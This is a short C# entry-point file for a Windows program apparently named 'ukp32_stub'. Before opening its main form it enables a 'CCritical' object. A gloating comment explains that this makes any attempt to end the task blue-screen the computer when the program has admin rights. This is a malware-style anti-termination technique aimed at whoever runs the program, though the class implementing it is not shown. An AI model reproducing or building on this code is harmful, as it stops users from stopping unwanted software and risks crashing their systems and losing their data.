using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;

namespace ukp32_stub
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            try
            {
                CCritical cc = new CCritical(); // If user tries to end task, they will blue-screen. >:) (If they are admin of course)
                cc.Enable();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                // Can't get administrative privleges, so we carry on.
            }

            Debug.WriteLine("\nlet's do this...\n");
            Application.Run(new MainForm());
        }
    }
}
